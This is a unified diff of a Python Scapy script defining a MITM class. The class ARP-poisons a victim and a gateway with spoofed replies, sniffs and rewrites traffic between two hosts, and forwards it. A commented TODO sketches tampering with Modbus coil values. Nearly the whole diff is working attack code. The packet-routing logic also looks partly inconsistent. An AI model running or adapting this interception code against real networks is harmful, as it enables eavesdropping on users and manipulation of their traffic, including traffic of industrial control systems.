@@ -449,39 +449,56 @@ MITM
 source from : http://stackoverflow.com/questions/12659553/man-in-the-middle-attack-with-scapy
 """
 class MITM:
-	packets=[]
 	def __init__(self,targetIP, victimIP,gatewayIP):
+		global iface
+#FIXME: seemsok to use only 2 params
 		self.target=(targetIP, getmacbyip(targetIP))
 		self.victim=(victimIP, getmacbyip(victimIP))
 		self.node2=(gatewayIP, getmacbyip(gatewayIP))
+		self.mymac=get_if_hwaddr(iface)
 		multiprocessing.Process(target=self.arp_poison).start()
 		try:
-			sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s))'%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x))
+			sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s))'%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x), iface=iface)
 		except KeyboardInterrupt as e:
 			pass
 			#wireshark(packets)
 	def routep(self,packet):
+		global iface
+		#Ignore packets from me
+		if packet[Ether].src == self.mymac:
+			return
+
 		#Prepare packet for forwarding
 		if packet.haslayer(IP):
-			print packet.summary()
 			if packet[IP].dst==self.victim[0]:
 				packet[Ether].src=packet[Ether].dst
 				packet[Ether].dst=self.victim[1]
-			elif packet[IP].dst==self.node2[0]:
+			elif packet[IP].dst==self.target[0]:
 				packet[Ether].src=packet[Ether].dst
 				packet[Ether].dst=self.node2[1]
-			self.packets.append(packet)
-			packet.display()
-			send(packet)
-			print len(self.packets)
-#			if len(self.packets)==10:
-#				wireshark(self.packets)
+			del(packet[IP].chksum)
+
+			if packet.haslayer(ICMP):
+				del(packet[ICMP].chksum)
+			if packet.haslayer(TCP):
+				del(packet[TCP].chksum)
+			if packet.haslayer(UDP):
+				del(packet[UDP].chksum)
+
+		#Include injection actions
+#TODO: create attack
+#		if self.action == "bridgeAlwaysUp":
+#			if ModbusReadRequest and addr = xx:
+#				packet[ReadCoil].value = xxx		
+
+		sendp(packet, iface=iface)
+
 	def arp_poison(self):
-		a=ARP(psrc=self.victim[0], pdst=self.node2[0])
-		b=ARP(psrc=self.node2[0], pdst=self.victim[0])
+		a=ARP(op=2, psrc=self.victim[0], pdst=self.node2[0])
+		b=ARP(op=2, psrc=self.node2[0], pdst=self.victim[0])
 		while True:
-			send(b)
-			send(a)
+			send(b, verbose=False)
+			send(a, verbose=False)
 			time.sleep(5)
 
 """
